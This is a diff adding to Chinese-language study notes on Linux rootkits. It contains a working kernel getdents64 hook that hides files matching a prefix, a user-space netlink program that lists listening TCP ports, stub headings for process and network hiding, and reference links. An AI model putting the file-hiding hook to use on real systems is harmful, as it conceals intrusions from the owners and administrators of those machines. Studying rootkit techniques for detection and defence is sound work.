@@ -459,6 +459,170 @@ struct linux_dirent64 {
 
 如果linux_dirent64的d_name等于期望隐藏的文件，则我们可以将上一个linux_dirent64的d_reclen 加上期望隐藏的文件的d_reclen
 
+```c
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+asmlinkage ssize_t hook_getdents64(const struct pt_regs *regs)
+{
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
+    struct linux_dirent64 *dirp_kern = NULL;
+    struct linux_dirent64 *current_dirp = NULL;
+    struct linux_dirent64 *previous_dirp = NULL;
+    ssize_t offset = 0;
+
+    ssize_t ret = orig_getdents64(regs);
+
+    if(ret <= 0) return ret;
+
+    dirp_kern = kzalloc(ret,GFP_KERNEL);
+    
+    if(dirp_kern == NULL ) return ret;
+
+    if(copy_from_user(dirp_kern,dirp,ret)){
+        goto done;
+    }
+
+    while(offset < ret){
+        previous_dirp = current_dirp;
+        current_dirp = (struct linux_dirent64*)((char*)dirp_kern + offset);
+
+        if(memcmp(PREFIX,current_dirp->d_name,strlen(PREFIX)) == 0){
+            printk(KERN_DEBUG "rootkit: Found %s\n", current_dirp->d_name);
+
+            if(previous_dirp == NULL){
+                ret -=  current_dirp->d_reclen;
+                memmove(current_dirp,(char*)current_dirp + current_dirp->d_reclen,ret);
+            }else{
+                previous_dirp->d_reclen += current_dirp->d_reclen;
+            }
+        }
+
+        offset += current_dirp->d_reclen;
+    }
+
+    if(copy_to_user(dirp,dirp_kern,ret)){
+        goto done;
+    }
+
+done:
+    kfree(dirp_kern);
+    return ret;
+}
+```
+
+
+
+# 进程隐藏
+
+通过getdents隐藏/proc/pid目录项
+
+
+
+# 网络信息隐藏
+
+在用户态通过netlink获取本机监听的网络端口信息
+```c
+#include <linux/inet_diag.h>
+#include <linux/netlink.h>
+#include <linux/sock_diag.h>
+#include <linux/tcp.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+#define BUFFER_SIZE 8192
+#define TCPF_LISTEN (1 << 10)  
+
+void parse_diag_msg(struct inet_diag_msg *diag_msg) {
+    struct sockaddr_in sa;
+    char ip[INET_ADDRSTRLEN];
+    int port = ntohs(diag_msg->id.idiag_sport);
+
+    sa.sin_family = AF_INET;
+    memcpy(&sa.sin_addr, diag_msg->id.idiag_src, sizeof(sa.sin_addr));
+    inet_ntop(AF_INET, &sa.sin_addr, ip, sizeof(ip));
+
+    printf("IP: %s, Port: %d\n", ip, port);
+}
+
+int main() {
+    int sock_fd;
+    struct sockaddr_nl sa;
+    char buffer[BUFFER_SIZE];
+    struct nlmsghdr *nlh;
+    struct inet_diag_req_v2 req;
+    int ret;
+
+    // 创建 netlink 套接字
+    sock_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_INET_DIAG);
+    if (sock_fd < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    memset(&sa, 0, sizeof(sa));
+    sa.nl_family = AF_NETLINK;
+
+    if (bind(sock_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        perror("bind");
+        close(sock_fd);
+        return -1;
+    }
+
+    // 准备 netlink 消息
+    nlh = (struct nlmsghdr *)buffer;
+    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(req));
+    nlh->nlmsg_type = SOCK_DIAG_BY_FAMILY;
+    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
+    nlh->nlmsg_seq = 1;
+    nlh->nlmsg_pid = getpid();
+
+    memset(&req, 0, sizeof(req));
+    req.sdiag_family = AF_INET;
+    req.sdiag_protocol = IPPROTO_TCP;
+    req.idiag_states = TCPF_LISTEN;
+
+    memcpy(NLMSG_DATA(nlh), &req, sizeof(req));
+
+    // 发送 netlink 消息
+    if (send(sock_fd, nlh, nlh->nlmsg_len, 0) < 0) {
+        perror("send");
+        close(sock_fd);
+        return -1;
+    }
+
+    // 接收并解析 netlink 响应
+    while ((ret = recv(sock_fd, buffer, sizeof(buffer), 0)) > 0) {
+        nlh = (struct nlmsghdr *)buffer;
+        while (NLMSG_OK(nlh, ret)) {
+            if (nlh->nlmsg_type == NLMSG_DONE)
+                break;
+
+            if (nlh->nlmsg_type == NLMSG_ERROR) {
+                fprintf(stderr, "Netlink error\n");
+                close(sock_fd);
+                return -1;
+            }
+
+            struct inet_diag_msg *diag_msg = (struct inet_diag_msg *)NLMSG_DATA(nlh);
+            parse_diag_msg(diag_msg);
+
+            nlh = NLMSG_NEXT(nlh, ret);
+        }
+    }
+
+    close(sock_fd);
+    return 0;
+}
+```
+
+### netlink分析
+
+
+
 # 参考资料
 
 awesome-linux-rootkits
@@ -482,3 +646,7 @@ Linux Rootkits Part 1: Introduction and Workflow
 https://xcellerator.github.io/posts/linux_rootkits_01/
 
 https://xcellerator.github.io/tags/rootkit/
+
+netlink实时获取网络信息原理分析
+
+https://www.anquanke.com/post/id/288932
